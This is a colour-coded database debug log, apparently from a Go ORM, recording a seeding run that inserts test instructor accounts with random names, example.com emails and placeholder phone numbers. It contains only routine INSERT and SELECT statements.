[0m[33m[5.731ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.794','2025-06-09 14:07:50.794',NULL,'lgopbqlkqb','LYyIXeG','CxQysyA','pWBBh','instructor18@example.com','+100000017','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.747ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 22 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.479ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.802','2025-06-09 14:07:50.802',NULL,true,22) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.095ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.808','2025-06-09 14:07:50.808',NULL,'pxrdjyuvfj','ETpJvqO','ImOHQtN','ZHlba','instructor19@example.com','+100000018','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.912ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 23 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.369ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.816','2025-06-09 14:07:50.816',NULL,true,23) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.626ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.824','2025-06-09 14:07:50.824',NULL,'gkmbfwnrof','hJVbwya','UPFKGCd','ytZlM','instructor20@example.com','+100000019','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[9.007ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 24 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[19.177ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.84','2025-06-09 14:07:50.84',NULL,true,24) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[12.925ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.851','2025-06-09 14:07:50.851',NULL,'maerkqfpme','GkeZMvm','HemRZmP','PyRaz','instructor21@example.com','+100000020','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.320ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 25 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[23.230ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.869','2025-06-09 14:07:50.869',NULL,true,25) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[11.507ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.89','2025-06-09 14:07:50.89',NULL,'eshygvpxrc','WmIbuQt','xhLhCcQ','vGFTd','instructor22@example.com','+100000021','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.853ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 26 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.967ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.901','2025-06-09 14:07:50.901',NULL,true,26) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.395ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.91','2025-06-09 14:07:50.91',NULL,'xswmtjofps','sJPSIeb','onNNvBb','etsQA','instructor23@example.com','+100000022','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.523ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 27 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.299ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.916','2025-06-09 14:07:50.916',NULL,true,27) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[10.076ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.925','2025-06-09 14:07:50.925',NULL,'oljyjhuqhe','RbRGMYc','duQYqSJ','vCCkw','instructor24@example.com','+100000023','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.525ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 28 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[9.155ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.933','2025-06-09 14:07:50.933',NULL,true,28) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.009ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.942','2025-06-09 14:07:50.942',NULL,'nbwklsltje','jCpSKpo','vdmaUQT','vKtjq','instructor25@example.com','+100000024','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.693ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 29 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[10.869ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.95','2025-06-09 14:07:50.95',NULL,true,29) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[14.944ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.961','2025-06-09 14:07:50.961',NULL,'jzzzfstado','LrpaCEL','gsxIoLR','gFZAM','instructor26@example.com','+100000025','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.721ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 30 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[10.419ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.975','2025-06-09 14:07:50.975',NULL,true,30) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.362ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.985','2025-06-09 14:07:50.985',NULL,'sbnqocrnrj','rpaCcfW','smZahYt','PEnjO','instructor27@example.com','+100000026','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.209ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 31 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[11.309ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.996','2025-06-09 14:07:50.996',NULL,true,31) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.398ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.003','2025-06-09 14:07:51.003',NULL,'bstsputkcs','GFTTKLa','KJWkKGG','mwGLb','instructor28@example.com','+100000027','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.649ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 32 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.136ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.01','2025-06-09 14:07:51.01',NULL,true,32) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.075ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.017','2025-06-09 14:07:51.017',NULL,'acdrukrctm','GLXihpx','wBXzYjH','DAEHt','instructor29@example.com','+100000028','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.769ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 33 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.856ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.025','2025-06-09 14:07:51.025',NULL,true,33) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.209ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.033','2025-06-09 14:07:51.033',NULL,'tofephpjdh','UviTlWV','oKLxMIw','bxcTw','instructor30@example.com','+100000029','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.841ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 34 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.688ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.04','2025-06-09 14:07:51.04',NULL,true,34) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.295ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.047','2025-06-09 14:07:51.047',NULL,'gduldvhivh','zWSnAXN','MNRwgup','mXPsd','instructor31@example.com','+100000030','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.826ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 35 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.122ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.054','2025-06-09 14:07:51.054',NULL,true,35) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.854ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.061','2025-06-09 14:07:51.061',NULL,'ctxmswvict','XyQmsiY','FHQkpvG','TKZAV','instructor32@example.com','+100000031','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.942ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 36 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.425ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.069','2025-06-09 14:07:51.069',NULL,true,36) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.444ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.076','2025-06-09 14:07:51.076',NULL,'dhcjzdubca','fssxapn','siwijTu','bLoyP','instructor33@example.com','+100000032','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.920ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 37 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.618ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.083','2025-06-09 14:07:51.083',NULL,true,37) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[8.185ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.092','2025-06-09 14:07:51.092',NULL,'uspvhekdeu','yLfZcWh','pJImlkN','dbTbc','instructor34@example.com','+100000033','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.041ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 38 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[9.340ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.099','2025-06-09 14:07:51.099',NULL,true,38) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.446ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.108','2025-06-09 14:07:51.108',NULL,'kbaudhzxhk','WByteTP','dzgxtUn','eDlur','instructor35@example.com','+100000034','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.128ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 39 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[13.628ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.116','2025-06-09 14:07:51.116',NULL,true,39) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[13.805ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.128','2025-06-09 14:07:51.128',NULL,'plrlmhgqxp','XlDPNeS','RTqPNDm','lNXsB','instructor36@example.com','+100000035','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[11.597ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 40 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[20.083ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.154','2025-06-09 14:07:51.154',NULL,true,40) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[9.288ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.162','2025-06-09 14:07:51.162',NULL,'ygytvswrxh','OYzfJfm','FBULxkB','nWGxS','instructor37@example.com','+100000036','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.429ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 41 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[9.483ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.172','2025-06-09 14:07:51.172',NULL,true,41) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[10.950ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.183','2025-06-09 14:07:51.183',NULL,'hgntwfddpy','iZwvhrM','fiGLfEE','nrKlq','instructor38@example.com','+100000037','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.924ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 42 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.498ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.194','2025-06-09 14:07:51.194',NULL,true,42) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.909ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.2','2025-06-09 14:07:51.2',NULL,'onkgoquvmy','xXbAagr','kEKKEIi','gqrom','instructor39@example.com','+100000038','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.555ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 43 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.999ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.207','2025-06-09 14:07:51.207',NULL,true,43) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[9.017ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.215','2025-06-09 14:07:51.215',NULL,'rbeltttfvl','fOpNEJD','oSYRCJX','lRZHO','instructor40@example.com','+100000039','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
